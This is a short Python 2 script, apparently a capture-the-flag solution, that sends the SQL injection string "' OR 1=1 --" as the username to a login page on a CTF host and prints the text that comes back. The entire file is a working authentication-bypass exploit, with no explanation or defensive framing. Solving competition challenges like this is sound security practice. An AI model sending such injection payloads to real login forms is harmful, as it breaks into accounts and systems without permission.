#!/usr/bin/env python2

import requests;

def main():
#{
    address = 'http://web.lasactf.com:63017/login.php';
    response = requests.post(address, data={'username': "' OR 1=1 --", 'password': 'anything'});
    print(response.text.split(':')[-1].strip().replace('</br>', ''));
#}

if(__name__ == "__main__"):
#{
    main();
#}